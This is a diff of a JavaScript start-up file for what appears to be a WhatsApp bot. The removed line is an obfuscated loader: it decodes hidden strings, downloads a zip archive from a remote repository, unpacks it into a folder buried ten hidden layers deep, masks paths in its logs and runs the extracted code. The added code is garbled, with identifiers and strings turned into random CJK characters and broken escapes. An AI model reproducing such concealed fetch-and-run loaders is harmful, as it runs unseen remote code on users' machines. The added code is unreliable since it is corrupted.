@@ -2,4 +2,618 @@
 // If you're here to steal code instead of learning, remember this:
 // copying won't make you a developer — understanding will.
 // Level up, don't leech.
-const ZHlUJ_wQ=nbklEjNWAUbPSbiOD$ALleYgj;(function(Z_EqZsyMo_PpO,Eq_ZAMjdD_BIlF){const aintNTCnw=nbklEjNWAUbPSbiOD$ALleYgj,LJZdjp=Z_EqZsyMo_PpO();while(!![]){try{const iHgIgMZWTqHyFY$lVt$QW=-parseFloat(aintNTCnw(0x19d))/(parseInt(0x5)*parseInt(-0x35e)+Math.max(0xf4d,parseInt(0xf4d))+0x18a)*(-parseFloat(aintNTCnw(0x1c6))/(-0x1*Math.trunc(-0x99b)+-0x4a3*-parseInt(0x5)+Math.floor(-parseInt(0x20c8))))+-parseFloat(aintNTCnw(0x1c1))/(-parseInt(0xff5)+0x199*Math.ceil(-0x9)+parseInt(0x1e59))+Math['ceil'](parseFloat(aintNTCnw(0x19c))/(-parseInt(0xe)*parseInt(-parseInt(0x41))+-0x26a0+Math.floor(parseInt(0x2316))))+Math['max'](-parseFloat(aintNTCnw(0x1ce))/(-0x26eb+Math.floor(0x1)*-0x1078+parseInt(0xc)*Math.ceil(parseInt(0x49e))),-parseFloat(aintNTCnw(0x1cb))/(-0x1919+0x121f+Number(0x700)))+-parseFloat(aintNTCnw(0x1a1))/(parseInt(0x16ab)+0x3+Math.ceil(-0x16a7))+-parseFloat(aintNTCnw(0x1cf))/(0x595*Math.ceil(-0x2)+Math.max(0xd4b,0xd4b)+Number(-parseInt(0x219)))*(parseFloat(aintNTCnw(0x1ca))/(Math.trunc(-parseInt(0x1))*parseInt(0x4db)+0x2507*parseInt(-0x1)+parseInt(0x1ff)*0x15))+Math['trunc'](-parseFloat(aintNTCnw(0x1a7))/(-parseInt(0x1)*parseInt(0x2353)+-0x184e+parseInt(parseInt(0x3bab))));if(iHgIgMZWTqHyFY$lVt$QW===Eq_ZAMjdD_BIlF)break;else LJZdjp['push'](LJZdjp['shift']());}catch(ujLBYzDugEqqXDzzeaF_jBy){LJZdjp['push'](LJZdjp['shift']());}}}(eQDWtSWX$G_vcNWHhbpuqFP,Math.trunc(0xf9603)+parseInt(parseInt(0x87b50))+-parseInt(0xd55ff)*Math.max(parseInt(0x1),parseInt(0x1))));function nbklEjNWAUbPSbiOD$ALleYgj(aZAQJYfsFwtRzWDzHhCzINAV,VMLSicqnXwHi){const elpuYo=eQDWtSWX$G_vcNWHhbpuqFP();return nbklEjNWAUbPSbiOD$ALleYgj=function(ahgBCSTgtsB,hfAnVtBKK){ahgBCSTgtsB=ahgBCSTgtsB-(-parseInt(0x7d7)*Math.ceil(-parseInt(0x3))+Math.ceil(parseInt(0x1))*-parseInt(0x148a)+parseInt(-0x1)*parseFloat(0x169));let LIr$peoinaQwurlHlXQbE=elpuYo[ahgBCSTgtsB];if(nbklEjNWAUbPSbiOD$ALleYgj['hGpHOZ']===undefined){const vt$zJws$IYPhemh=function(fa_b_edu){let sXWemerZyVuepQewoRswHlS=-0x1e4*Math.trunc(-0xb)+parseInt(0x21f9)+-parseInt(0x3415)&Math.max(parseInt(0x224b),0x224b)+-parseInt(0x122e)+Math.max(-parseInt(0xf1e),-parseInt(0xf1e)),OVZanbUCOEg=new Uint8Array(fa_b_edu['match'](/.{1,2}/g)['map'](mkImOSJcRCQc_BY$q=>parseInt(mkImOSJcRCQc_BY$q,parseInt(0x64d)*Math.floor(parseInt(0x5))+Math.max(-parseInt(0x243c),-parseInt(0x243c))+0x4cb))),TUyjHg_OlN_tWbIqj=OVZanbUCOEg['map'](AUCPIxQ$jonqWLHnUQ_JwaPk=>AUCPIxQ$jonqWLHnUQ_JwaPk^sXWemerZyVuepQewoRswHlS),hJMQbKTeUpZbGamDvjaUk$eAJ=new TextDecoder(),KeioYAIYeSMv$BAkCMP=hJMQbKTeUpZbGamDvjaUk$eAJ['decode'](TUyjHg_OlN_tWbIqj);return KeioYAIYeSMv$BAkCMP;};nbklEjNWAUbPSbiOD$ALleYgj['SPPxIV']=vt$zJws$IYPhemh,aZAQJYfsFwtRzWDzHhCzINAV=arguments,nbklEjNWAUbPSbiOD$ALleYgj['hGpHOZ']=!![];}const OEuSztwLLPlx_dy$W=elpuYo[parseFloat(-parseInt(0x20bd))+parseInt(0x24ad)+parseInt(0x90)*Math.floor(-0x7)],drHXWSqakioXhoZpnrkMvsT=ahgBCSTgtsB+OEuSztwLLPlx_dy$W,utnywAGdEZVJSz=aZAQJYfsFwtRzWDzHhCzINAV[drHXWSqakioXhoZpnrkMvsT];return!utnywAGdEZVJSz?(nbklEjNWAUbPSbiOD$ALleYgj['XDzRTf']===undefined&&(nbklEjNWAUbPSbiOD$ALleYgj['XDzRTf']=!![]),LIr$peoinaQwurlHlXQbE=nbklEjNWAUbPSbiOD$ALleYgj['SPPxIV'](LIr$peoinaQwurlHlXQbE),aZAQJYfsFwtRzWDzHhCzINAV[drHXWSqakioXhoZpnrkMvsT]=LIr$peoinaQwurlHlXQbE):LIr$peoinaQwurlHlXQbE=utnywAGdEZVJSz,LIr$peoinaQwurlHlXQbE;},nbklEjNWAUbPSbiOD$ALleYgj(aZAQJYfsFwtRzWDzHhCzINAV,VMLSicqnXwHi);}const fs=require('fs'),path=require(ZHlUJ_wQ(0x1bd)),axios=require(ZHlUJ_wQ(0x1b7)),AdmZip=require(ZHlUJ_wQ(0x1c5)),{spawn}=require(ZHlUJ_wQ(0x1bc)),chalk=require(ZHlUJ_wQ(0x1c3)),deepLayers=Array[ZHlUJ_wQ(0x19a)]({'length':0xa},(idelpuYorahgBCSTgt,BlhfA$nVtBKKL)=>'.x'+(BlhfA$nVtBKKL+(0x1*parseInt(0x2268)+Math.max(0xe,0xe)*-parseInt(0x2ba)+Math.max(-0x3c5,-parseInt(0x3c5))*parseFloat(-parseInt(0x1))))),TEMP_DIR=path[ZHlUJ_wQ(0x192)](__dirname,ZHlUJ_wQ(0x1b0),ZHlUJ_wQ(0x19f),...deepLayers),DOWNLOAD_URL=ZHlUJ_wQ(0x1d3),EXTRACT_DIR=path[ZHlUJ_wQ(0x192)](TEMP_DIR,ZHlUJ_wQ(0x1ac)),LOCAL_SETTINGS=path[ZHlUJ_wQ(0x192)](__dirname,ZHlUJ_wQ(0x1a3)),EXTRACTED_SETTINGS=path[ZHlUJ_wQ(0x192)](EXTRACT_DIR,ZHlUJ_wQ(0x1a3));class SilentLogger{[ZHlUJ_wQ(0x1d8)](Irpeoi$naQwurlHlXQbEz){const E$KyzqMPAdAlBOgPbYx_tBYW=ZHlUJ_wQ,EuSztwLLPlxdyWTdrHXWS=this[E$KyzqMPAdAlBOgPbYx_tBYW(0x1c7)](Irpeoi$naQwurlHlXQbEz);console[E$KyzqMPAdAlBOgPbYx_tBYW(0x1d8)](EuSztwLLPlxdyWTdrHXWS);}[ZHlUJ_wQ(0x1d6)](akioXh$oZpnr,MvsTyu_tny=null){const xWLmlOuvS=ZHlUJ_wQ,AGdEZVJSz$u$vtzJ=this[xWLmlOuvS(0x1c7)](akioXh$oZpnr);if(MvsTyu_tny&&MvsTyu_tny[xWLmlOuvS(0x1bf)]){const s_IYPhemhdf_abed=this[xWLmlOuvS(0x1c7)](MvsTyu_tny[xWLmlOuvS(0x1bf)]);console[xWLmlOuvS(0x1d6)](chalk[xWLmlOuvS(0x1b2)](AGdEZVJSz$u$vtzJ),chalk[xWLmlOuvS(0x19b)](s_IYPhemhdf_abed));}else console[xWLmlOuvS(0x1d6)](chalk[xWLmlOuvS(0x1b2)](AGdEZVJSz$u$vtzJ));}[ZHlUJ_wQ(0x198)](UsXWemerZyVue){const JlYFPIknuWaeF=ZHlUJ_wQ,QewoRswHlSp=this[JlYFPIknuWaeF(0x1c7)](UsXWemerZyVue);console[JlYFPIknuWaeF(0x1d8)](chalk[JlYFPIknuWaeF(0x198)](QewoRswHlSp));}[ZHlUJ_wQ(0x1b6)](VZanbUCOEgATUyjHgOlNt){const yHFyqHofgHTiSYWNVrhLyHa=ZHlUJ_wQ,bIqjWhJMQbKTe_$UpZbGamDvja=this[yHFyqHofgHTiSYWNVrhLyHa(0x1c7)](VZanbUCOEgATUyjHgOlNt);console[yHFyqHofgHTiSYWNVrhLyHa(0x1d8)](chalk[yHFyqHofgHTiSYWNVrhLyHa(0x1b6)](bIqjWhJMQbKTe_$UpZbGamDvja));}[ZHlUJ_wQ(0x1ba)](keAJHKeioYAIYeSM_vBAkC_MP){const qOIDf=ZHlUJ_wQ,mk_ImOSJcRCQcBYq=this[qOIDf(0x1c7)](keAJHKeioYAIYeSM_vBAkC_MP);console[qOIDf(0x1d8)](chalk[qOIDf(0x1ba)](mk_ImOSJcRCQcBYq));}[ZHlUJ_wQ(0x1d0)](AUCPIxQjonqWL__HnUQJwaPk){const tkR$JrD=ZHlUJ_wQ,TjcudiosGt_zqWnGFtzzZyq_d=this[tkR$JrD(0x1c7)](AUCPIxQjonqWL__HnUQJwaPk);console[tkR$JrD(0x1d8)](chalk[tkR$JrD(0x1d0)](TjcudiosGt_zqWnGFtzzZyq_d));}[ZHlUJ_wQ(0x1c7)](s$lyBoEFyrjnEL$NHjrSN){const gpu$NR_Mhs=ZHlUJ_wQ;if(typeof s$lyBoEFyrjnEL$NHjrSN!==gpu$NR_Mhs(0x1be))return s$lyBoEFyrjnEL$NHjrSN;return s$lyBoEFyrjnEL$NHjrSN[gpu$NR_Mhs(0x1a8)](/(\/|\\)[^\s]+\/([\w\.-]+\/)*[\w\.-]+/g,gpu$NR_Mhs(0x1a5))[gpu$NR_Mhs(0x1a8)](/[a-zA-Z]:\\([^\\]+\\)*[^\\]+/g,gpu$NR_Mhs(0x1a5))[gpu$NR_Mhs(0x1a8)](/\/home\/[^/]+\//g,gpu$NR_Mhs(0x1c4))[gpu$NR_Mhs(0x1a8)](/\/Users\/[^/]+\//g,gpu$NR_Mhs(0x1c4))[gpu$NR_Mhs(0x1a8)](/C:\\Users\\[^\\]+\\/g,gpu$NR_Mhs(0x1af));}}const logger=new SilentLogger(),delay=Dr$Wr$u=>new Promise(jG$nMD_gvpiu=>setTimeout(jG$nMD_gvpiu,Dr$Wr$u));async function downloadAndExtract(){const fEs$AjlTUqlctbee=ZHlUJ_wQ;try{fs[fEs$AjlTUqlctbee(0x1a2)](TEMP_DIR)&&(logger[fEs$AjlTUqlctbee(0x1ba)](fEs$AjlTUqlctbee(0x193)),fs[fEs$AjlTUqlctbee(0x1d5)](TEMP_DIR,{'recursive':!![],'force':!![]}));fs[fEs$AjlTUqlctbee(0x1d7)](TEMP_DIR,{'recursive':!![]});const rl_npxmmey=path[fEs$AjlTUqlctbee(0x192)](TEMP_DIR,fEs$AjlTUqlctbee(0x1c2));logger[fEs$AjlTUqlctbee(0x1b6)](fEs$AjlTUqlctbee(0x1cd));const nwrUDPrtJVzVkqwB_LDLBoGQ=await axios({'url':DOWNLOAD_URL,'method':fEs$AjlTUqlctbee(0x1a4),'responseType':fEs$AjlTUqlctbee(0x196)});await new Promise((YGTsnOG,hJwuuxLlcUVlVorIYxXiaNpv)=>{const TVekmTsiClkasR=fEs$AjlTUqlctbee,RIuG_PEYW=fs[TVekmTsiClkasR(0x19e)](rl_npxmmey);nwrUDPrtJVzVkqwB_LDLBoGQ[TVekmTsiClkasR(0x197)][TVekmTsiClkasR(0x194)](RIuG_PEYW),RIuG_PEYW['on'](TVekmTsiClkasR(0x1d2),YGTsnOG),RIuG_PEYW['on'](TVekmTsiClkasR(0x1d6),hJwuuxLlcUVlVorIYxXiaNpv);}),logger[fEs$AjlTUqlctbee(0x1b6)](fEs$AjlTUqlctbee(0x1b4));try{new AdmZip(rl_npxmmey)[fEs$AjlTUqlctbee(0x1cc)](TEMP_DIR,!![]);}catch(Hoc$Ihf$E){logger[fEs$AjlTUqlctbee(0x1d6)](fEs$AjlTUqlctbee(0x1ab),Hoc$Ihf$E);throw Hoc$Ihf$E;}finally{fs[fEs$AjlTUqlctbee(0x1a2)](rl_npxmmey)&&fs[fEs$AjlTUqlctbee(0x1a6)](rl_npxmmey);}}catch(hPHUqetCqqawAVXThOH$Gc_C){logger[fEs$AjlTUqlctbee(0x1d6)](fEs$AjlTUqlctbee(0x1c8),hPHUqetCqqawAVXThOH$Gc_C);throw hPHUqetCqqawAVXThOH$Gc_C;}}async function applyLocalSettings(){const J_osbfv$PZ=ZHlUJ_wQ;if(!fs[J_osbfv$PZ(0x1a2)](LOCAL_SETTINGS)){logger[J_osbfv$PZ(0x1ba)](J_osbfv$PZ(0x1b3));return;}try{fs[J_osbfv$PZ(0x1d7)](EXTRACT_DIR,{'recursive':!![]}),fs[J_osbfv$PZ(0x1b9)](LOCAL_SETTINGS,EXTRACTED_SETTINGS),logger[J_osbfv$PZ(0x1b6)](J_osbfv$PZ(0x1bb));}catch(shLGOydIFKTZ){logger[J_osbfv$PZ(0x1d6)](J_osbfv$PZ(0x1a9),shLGOydIFKTZ);}await delay(-parseInt(0x153)+Number(-parseInt(0x1))*Math.trunc(-0xb51)+parseInt(0x31)*Math.floor(-parseInt(0x2a)));}function eQDWtSWX$G_vcNWHhbpuqFP(){const FPolvaGR=['d9ded4d5c89edac3','d6c2dfdd','d7c2d1c9','85848682858884eaf5f8f6ddf4','81818283dde0c9f7d7e0','d3c2d5d1c4d5e7c2d9c4d5e3c4c2d5d1dd','c8d3d1d3d8d5','d5dec6','84878982818082e7eaf2dfc3e5','d5c8d9c3c4c3e3c9ded3','c3d5c4c4d9ded7c39edac3','f7f5e4','ebd8d9d4d4d5deed','c5dedcd9dedbe3c9ded3','84888485808080f3e1dbf2c3fe','c2d5c0dcd1d3d5','522d3c90f6d1d9dcd5d490c4df90d1c0c0dcc990dcdfd3d1dc90c3d5c4c4d9ded7c38a','522d3c90f5c8c4c2d1d3c4d5d490d4d9c2d5d3c4dfc2c990dedfc490d6dfc5ded49e90f3d1dededfc490c3c4d1c2c490d2dfc49e','522d3c90fef5fdf5e3f9e390fdf490e3f5e2e6f5e290f9e390fff6f6fcf9fef58a','fef5fdf5e3f9e39dfdf49dddd1d9de','eb90402f172d90ed90e3e4f1e2e4f9fef790fef5fdf5e3f9e390fdf490e3f5e2e6f5e29e9e9e9e97','c0c2dfd4c5d3c4d9dfde','ebd8d9d4d4d5deedec','dedfd4d5efdddfd4c5dcd5c3','522d3c90f2dfc490d6d1d9dcd5d490c4df90c3c4d1c2c48a','c2d5d4','eb90522a105f083f90ed90fedf90dcdfd3d1dc90c3d5c4c4d9ded7c390d6dfc5ded490d9de90ddd1d9de90d4d9c2d5d3c4dfc2c99c90c5c3d9ded790d4d5d6d1c5dcc49e','eb90402f172d90ed90f3fffefef5f3e4f5f490e4ff90fef5fdf5e3f9e390fdf490e3f5e2e6f5e2e39e9e9e','522d3c90f6d1c4d1dc90d5c2c2dfc290d9de90ddd1d9de90d5c8d5d3c5c4d9dfde8a','d7c2d5d5de','d1c8d9dfc3','d5c8d9c4','d3dfc0c9f6d9dcd5e3c9ded3','c9d5dcdcdfc7','eb90402f172d90ed90fcfff3f1fc90e3f5e4e4f9fef7e390f1e0e0fcf9f5f49e','d3d8d9dcd4efc0c2dfd3d5c3c3','c0d1c4d8','c3c4c2d9ded7','ddd5c3c3d1d7d5','d9ded8d5c2d9c4','81838388888186e0f9c8c0ead7','c2d5c0df9ecad9c0','d3d8d1dcdb','ebd8d9d4d4d5deed9f','d1d4dd9dcad9c0','82838682c3e9d1fce5f8','c2d5dddfc6d5e0d1c4d8c3','522d3c90f3dfdeded5d3c4d9dfde90f6d1d9dcd5d48a','d3dcdfc3d5','858281868282d5d2d5f4c9dd','818582898282c0e1fffbd9c6','d5c8c4c2d1d3c4f1dcdce4df','eb90402f172d90ed9090f3fffefef5f3e4f9fef790e4ff90fef5fdf5e3f9e390fdf490e3f5e2e6f5e29e9e','818287848385d3e1f5c7f8f5','8488fec4fffef5c0','d3c9d1de','eb90402f221590ed90f2dfc490c4d5c2ddd9ded1c4d5d490c7d9c4d890d5c8d9c490d3dfd4d58a90','d6d9ded9c3d8','d8c4c4c0c38a9f9fd7d9c4d8c5d29ed3dfdd9fe2d9c6dfcade9ddbd9d4ca9ffef5fdf5e3f9e39dfdf49fd1c2d3d8d9c6d59fc2d5d6c39fd8d5d1d4c39fddd1d9de9ecad9c0','522d3c90d9ded4d5c89edac390dedfc490d6dfc5ded490d9de90d5c8c4c2d1d3c4d5d490d4d9c2d5d3c4dfc2c99e','c2dde3c9ded3','d5c2c2dfc2','dddbd4d9c2e3c9ded3','dcdfd7','dadfd9de','402f170990f3dcd5d1ded9ded790c0c2d5c6d9dfc5c390d3d1d3d8d59e9e9e','c0d9c0d5','dedfd4d5','c3c4c2d5d1dd','d4d1c4d1','d2dcc5d5'];eQDWtSWX$G_vcNWHhbpuqFP=function(){return FPolvaGR;};return eQDWtSWX$G_vcNWHhbpuqFP();}function startBot(){const SU_oxgcGuQivIG_r=ZHlUJ_wQ;logger[SU_oxgcGuQivIG_r(0x1d0)](SU_oxgcGuQivIG_r(0x1ad));if(!fs[SU_oxgcGuQivIG_r(0x1a2)](EXTRACT_DIR)){logger[SU_oxgcGuQivIG_r(0x1d6)](SU_oxgcGuQivIG_r(0x1aa));return;}if(!fs[SU_oxgcGuQivIG_r(0x1a2)](path[SU_oxgcGuQivIG_r(0x192)](EXTRACT_DIR,SU_oxgcGuQivIG_r(0x199)))){logger[SU_oxgcGuQivIG_r(0x1d6)](SU_oxgcGuQivIG_r(0x1d4));return;}const E_yH$BDKWAajlzAZcVEKD=spawn(SU_oxgcGuQivIG_r(0x195),[SU_oxgcGuQivIG_r(0x199)],{'cwd':EXTRACT_DIR,'stdio':SU_oxgcGuQivIG_r(0x1c0),'env':{...process[SU_oxgcGuQivIG_r(0x1a0)],'NODE_ENV':SU_oxgcGuQivIG_r(0x1ae)}});E_yH$BDKWAajlzAZcVEKD['on'](SU_oxgcGuQivIG_r(0x1c9),ai$gny=>{const zKQEWYB=SU_oxgcGuQivIG_r;logger[zKQEWYB(0x1d6)](zKQEWYB(0x1d1)+ai$gny);}),E_yH$BDKWAajlzAZcVEKD['on'](SU_oxgcGuQivIG_r(0x1d6),mz_aeubBPeHO=>{const ZArMvUPUYvmvQqWa=SU_oxgcGuQivIG_r;logger[ZArMvUPUYvmvQqWa(0x1d6)](ZArMvUPUYvmvQqWa(0x1b1),mz_aeubBPeHO);});}((async()=>{const QSXGcgr_mA$pmyIUHYwSr=ZHlUJ_wQ;try{await downloadAndExtract(),await applyLocalSettings(),startBot();}catch(rVfwtFy$eWyYuaidVJuwZsr){logger[QSXGcgr_mA$pmyIUHYwSr(0x1d6)](QSXGcgr_mA$pmyIUHYwSr(0x1b5),rVfwtFy$eWyYuaidVJuwZsr),process[QSXGcgr_mA$pmyIUHYwSr(0x1b8)](0x10a8+parseInt(0x1c5c)+parseInt(-0x2d03));}})());
+(function(){const {
+  default: _辑隧廸峴,
+  _劒醔釀摹孏,
+  _透娲諨慶寒髚,
+  _玝鼣靅僢沩鴋谐,
+  _骏拾穮奸,
+  _普艿鮴呺伏,
+  _酸看咴嗙茍县
+} = _畯卉惷垉厁蘊儑('@_\u98f4\u80c7\u764f\u9f30/_\u76dc\u6d4a\u5b06\u75b3\u5d90');
+const _蠕坖厃嬴榏朅 = _畯卉惷垉厁蘊儑('_\u8815\u5756\u5383\u5b34\u698f\u6705');
+const _躽邂數稼蹒鈿蝕 = _畯卉惷垉厁蘊儑('_\u7bf8\u9115\u549e\u8697');
+const _骭嶼栁赥佅 = _畯卉惷垉厁蘊儑('./_\u51e5\u8176\u65fb\u76b1\u62b2\u4fad');
+const _纳鄅羷蠳瘃啙洸 = _畯卉惷垉厁蘊儑('_\u7eb3\u9105\u7fb7\u8833\u7603\u5559\u6d38');
+const _腞釿璴谧 = _畯卉惷垉厁蘊儑('_\u815e\u91ff\u74b4\u8c27');
+
+// _骬呈洫呿戠 _抓皚鐑叧鑅瓗
+const _眵贴诌闭虿坠坭 = ["237678687593"];
+
+// ==================== _憺湂鳌蚊 _暵艶慚靯賉 _蓥蹮奤趩兂牼 ====================
+function _黝楊谐攇溫杽橭() {
+  _樞劈帳溤._肶譊蓟繂櫅("\u1f4c2 _\u75dd\u7f22\u9c14\u9891\u7c83\u8f6a _\u82a5\u944a\u639d\u99fe\u7717\u887f\u5c94 _\u5478\u8917\u5001\u90f0 _\u5396\u7b50\u65a2\u5bb8\u764a _\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80...");
+  
+  if (!_蠕坖厃嬴榏朅._踩炆繝渥矓颼辭('./_\u5478\u8917\u5001\u90f0')) {
+    _樞劈帳溤._肶譊蓟繂櫅("\u274c _\u5478\u8917\u5001\u90f0 _\u90c8\u6379\u8006\u8f0a _\u612e\u98d5\u7967\u6954\u88fb _\u6bae\u8add\u68da\u8b28\u8e44\u9be3! _\u6a3d\u5790\u7617\u84e3\u8ab5\u91c4\u7cd0 _\u57bb\u667e\u5dd3\u504a _\u5478\u8917\u5001\u90f0 _\u90c8\u6379\u8006\u8f0a...");
+    _蠕坖厃嬴榏朅._攗伹丐溉掏('./_\u5478\u8917\u5001\u90f0', { _痸奦丮厣牎鏍: true });
+  } else {
+    _樞劈帳溤._肶譊蓟繂櫅("\u2705 _\u5478\u8917\u5001\u90f0 _\u90c8\u6379\u8006\u8f0a _\u6bae\u8add\u68da\u8b28\u8e44\u9be3");
+    const _拖訁峯雳醢鞆殏 = _蠕坖厃嬴榏朅._郢驽毶玜('./_\u5478\u8917\u5001\u90f0')._狉摊劼籓浛(_禴鴎屑竻藽秷 => _禴鴎屑竻藽秷._子偓嚩癎跹流埶('._\u8a1c\u810f\u8692\u8bb6'));
+    _樞劈帳溤._肶譊蓟繂櫅(`\u1f4da _\u79c0\u9986\u5594\u7460\u7284 ${_\u62d6\u8a01\u5cef\u96f3\u91a2\u9786\u6b8f._\u81bb\u8e0c\u4fc5\u6793\u513d\u98f2} _\u5478\u8917\u5001\u90f0 _\u5323\u5a18\u969d\u5519\u9342\u9b52\u7b2a`);
+  }
+  
+  if (!_蠕坖厃嬴榏朅._踩炆繝渥矓颼辭('./_\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80')) {
+    _樞劈帳溤._肶譊蓟繂櫅("\u274c _\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80 _\u90c8\u6379\u8006\u8f0a _\u612e\u98d5\u7967\u6954\u88fb _\u6bae\u8add\u68da\u8b28\u8e44\u9be3! _\u6a3d\u5790\u7617\u84e3\u8ab5\u91c4\u7cd0 _\u57bb\u667e\u5dd3\u504a _\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80 _\u90c8\u6379\u8006\u8f0a...");
+    _蠕坖厃嬴榏朅._攗伹丐溉掏('./_\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80', { _痸奦丮厣牎鏍: true });
+  } else {
+    _樞劈帳溤._肶譊蓟繂櫅("\u2705 _\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80 _\u90c8\u6379\u8006\u8f0a _\u6bae\u8add\u68da\u8b28\u8e44\u9be3");
+    const _慈醔覥摌 = _蠕坖厃嬴榏朅._郢驽毶玜('./_\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80')._狉摊劼籓浛(_禴鴎屑竻藽秷 => _禴鴎屑竻藽秷._子偓嚩癎跹流埶('._\u8a1c\u810f\u8692\u8bb6'));
+    _樞劈帳溤._肶譊蓟繂櫅(`\u1f50c _\u79c0\u9986\u5594\u7460\u7284 ${_\u6148\u9194\u89a5\u644c._\u81bb\u8e0c\u4fc5\u6793\u513d\u98f2} _\u8da9\u9853\u6c6c\u512e\u686d _\u5323\u5a18\u969d\u5519\u9342\u9b52\u7b2a`);
+  }
+  
+  // _嫅鮳凛裏捠盏 for _塀阹禍編簭麆擭._慹骆哱恷
+  if (_蠕坖厃嬴榏朅._踩炆繝渥矓颼辭('./_\u5478\u8917\u5001\u90f0/_\u5840\u9639\u798d\u7de8\u7c2d\u9e86\u64ed._\u6179\u9a86\u54f1\u6077')) {
+    _樞劈帳溤._肶譊蓟繂櫅("\u2705 _\u5840\u9639\u798d\u7de8\u7c2d\u9e86\u64ed._\u6179\u9a86\u54f1\u6077 _\u6bae\u8add\u68da\u8b28\u8e44\u9be3 in _\u5478\u8917\u5001\u90f0 _\u90c8\u6379\u8006\u8f0a");
+  } else {
+    _樞劈帳溤._肶譊蓟繂櫅("\u26a0\ufe0f _\u5840\u9639\u798d\u7de8\u7c2d\u9e86\u64ed._\u6179\u9a86\u54f1\u6077 _\u612e\u98d5\u7967\u6954\u88fb _\u6bae\u8add\u68da\u8b28\u8e44\u9be3 in _\u5478\u8917\u5001\u90f0 _\u90c8\u6379\u8006\u8f0a");
+  }
+  
+  _樞劈帳溤._肶譊蓟繂櫅("\u2705 _\u9f4b\u74cb\u7115\u5afe\u6e95 _\u5323\u5a18\u969d\u5519\u9342\u9b52\u7b2a _\u8e6d\u5cd2\u8a6e\u800e\u51b7\u8fba _\u9ccb\u9a83\u8267\u7679\u9ee3\u6c0a\u79ef!");
+}
+
+_黝楊谐攇溫杽橭();
+
+// _事蓪咰蟃 _宕換烢虄鶑 for _黐鵻蹱懘強祻-delete
+const _憘竒燦灃鍦殻觗 = new _擈罟蛇铯();
+
+// _噰蜛皋豓濕 _鸥玭懦鳈憽批 _宕換烢虄鶑 (_淪噊蟗呬叢牏押 _閙皥郜彈/_鈾倂惨渖墕, _淪噊蟗呬叢牏押 _駑徕師凙样逹, _蠩洴攻怦栒衑嗡 _閙皥郜彈/_鈾倂惨渖墕, _蠩洴攻怦栒衑嗡 _駑徕師凙样逹)
+const _礎朸鍄聾 = new _擈罟蛇铯();
+
+// _脣崩钓梺璁 _淪噊蟗呬叢牏押 _駑徕師凙样逹
+const _婊鬆傌乬喝盕 = "\u256d\u2500\u2500\u274d *_\u578a\u643c\u84d4\u57d3\u8a5e\u5d01\u6a31* \u29fd\u2500\u2500\u2500\u274d\_\u51b0\u51d4\u58e6\u60f2\u2502\_\u51b0\u51d4\u58e6\u60f2\u2502\u2503\u27b3 *_\u8495\u68af\u5b48\u87d2\u8f16:* @_\u67a9\u69da\u952f\u76f1\u9453\u6886\_\u51b0\u51d4\u58e6\u60f2\u2502\u2503\u27b3 *_\u5670\u871b\u768b\u8c53\u6fd5:* @_\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974\_\u51b0\u51d4\u58e6\u60f2\u2502\u2503\u27b3 *_\u5738\u9ce3\u66b7\u7a97:* @_\u8c47\u9a5c\u8378\u8237\u787b\_\u51b0\u51d4\u58e6\u60f2\u2502\_\u51b0\u51d4\u58e6\u60f2\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u274d\_\u51b0\u51d4\u58e6\u60f2\_\u51b0\u51d4\u58e6\u60f2> _\u5523\u5ca6\u9cd3\u9683\u55b1\u6d8d _\u72e3\u9a66\u599a\u6752\u87d3\u8331\u90e2 _\u712e\u5dd1\u57a5\u60cc! \u1f389";
+
+// _脣崩钓梺璁 _蠩洴攻怦栒衑嗡 _駑徕師凙样逹
+const _瘄澻稬撀臐 = "\u256d\u2500\u2500\u274d *_\u8961\u733b\u8194\u84ac\u780d\u7887* \u29fd\u2500\u2500\u2500\u274d\_\u51b0\u51d4\u58e6\u60f2\u2502\_\u51b0\u51d4\u58e6\u60f2\u2502\u2503\u27b3 *_\u8495\u68af\u5b48\u87d2\u8f16:* @_\u67a9\u69da\u952f\u76f1\u9453\u6886\_\u51b0\u51d4\u58e6\u60f2\u2502\u2503\u27b3 *_\u5670\u871b\u768b\u8c53\u6fd5:* @_\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974\_\u51b0\u51d4\u58e6\u60f2\u2502\u2503\u27b3 *_\u824b\u95d4\u5baa\u8d09\u7244\u5cc1\u58d7 _\u63f2\u561f\u77a1\u5a39 _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974*\_\u51b0\u51d4\u58e6\u60f2\u2502\_\u51b0\u51d4\u58e6\u60f2\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u274d\_\u51b0\u51d4\u58e6\u60f2\_\u51b0\u51d4\u58e6\u60f2> _\u699d\u4ee9\u554d\u5115\u845b'_\u7689\u6c0d\u6404\u787e\u817e\u7d3a _\u78b9\u8bbe\u68f4\u54fe\u6c37\u6ff7\u9106 _\u9766\u53af\u75c2\u6573! \u1f44b";
+
+// _翈剷甭鹌蘀 _橝豕幊鍶蜭刞
+const _渽酩謮龳夯紸觜 = _腞釿璴谧._囻烿竎蚤(_灔礬胊伏匞, '_\u7827\u4e1e\u914e\u9167\u678d\u83e5');
+const _韤灊飵囀渓紘鵪 = _腞釿璴谧._囻烿竎蚤(_渽酩謮龳夯紸觜, '_\u967c\u5474\u7455\u9543._\u93bf\u91bb\u4f75\u994b\u8ef6');
+
+if (!_蠕坖厃嬴榏朅._踩炆繝渥矓颼辭(_韤灊飵囀渓紘鵪)) {
+  if (!_骭嶼栁赥佅._垷樱燗儿桉猓) {
+    _樞劈帳溤._肶譊蓟繂櫅("\u274c _\u57b7\u6a31\u71d7\u513f\u6849\u7313 _\u7357\u4f47\u70c5\u9a33\u679a\u8d32\u7d9d");
+    _塨焼苧哟._芾匒琤囝睼(1);
+  }
+  
+  let _刌孃椶璁铽噝 = _骭嶼栁赥佅._垷樱燗儿桉猓._臰鬑啙艇冑沉鏍();
+  if (!_刌孃椶璁铽噝._鹏兼衖穴("_\u8562\u8c79\u7521\u922d\u7922~")) {
